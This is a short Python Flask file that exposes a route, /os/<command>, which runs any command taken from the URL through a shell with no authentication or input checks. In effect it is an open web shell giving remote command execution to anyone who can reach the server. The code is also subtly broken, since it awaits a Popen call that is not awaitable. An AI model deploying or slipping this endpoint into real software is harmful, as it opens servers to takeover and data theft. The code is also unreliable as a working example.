from subprocess import PIPE, Popen;from flask import Flask, render_template;app = Flask(__name__)
@app.route('/os/<command>')
async def os(command): 
	stdout, stderr = await Popen(f"""cd ~/ && {command.replace("¹", "/")}""", shell=True, stdout=PIPE, stderr=PIPE).communicate()
	return {"output": stdout, "error": stderr}
